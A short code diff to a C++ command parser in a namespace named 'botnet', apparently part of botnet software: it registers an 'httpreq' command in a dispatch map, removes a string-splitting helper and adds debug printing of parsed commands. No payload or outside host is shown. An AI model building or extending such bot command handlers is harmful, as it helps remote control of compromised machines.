@@ -1,23 +1,12 @@
 #include "parser.h"
+#include "commands.h"
 
 #include <iostream>
 
 namespace botnet {
     parser::parser(std::string src) :src_(src) {
         // TODO: the functions of commands should be declared here
-    }
-
-    std::vector<std::string> parser::split(std::string str, std::string sep){
-        char* cstr = const_cast<char*>(str.c_str());
-        char* current;
-        std::vector<std::string> arr;
-
-        current = strtok(cstr, sep.c_str());
-        while (current != NULL){
-            arr.push_back(current);
-            current = strtok(NULL, sep.c_str());
-        }
-        return arr;
+        funcs_["httpreq"] = http_req;
     }
 
     void parser::execute() {
@@ -33,6 +22,9 @@ namespace botnet {
             std::size_t found = arr[i].find_first_of(":");
             command = arr[i].substr(0, found);
             content = arr[i].substr(found + 1);
+
+            std::cout << "command: " << command << '\n';
+            std::cout << "content: " << content << '\n';
 
             // if the command was defined in functions map
             // try execute the command
